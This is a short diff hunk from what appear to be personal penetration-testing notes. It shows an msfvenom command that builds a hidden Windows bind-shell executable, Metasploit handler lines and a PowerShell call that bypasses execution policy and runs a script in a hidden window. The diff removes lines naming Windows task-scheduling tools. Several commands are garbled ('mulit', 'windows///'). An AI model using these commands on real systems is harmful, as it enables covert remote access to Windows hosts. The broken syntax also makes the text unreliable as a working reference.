@@ -34,8 +34,3 @@ msfvenom -p windows/shell_hidden_bind_tcp LPORT=8889 AHOST=192.168.52.129 -f exe
 use exploit/mulit/handler
 set payload windows///
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden —File "C:\do_neat_ps_shit.ps1"
-
-
-taskschd.msc
-taskmgr
-schtasks
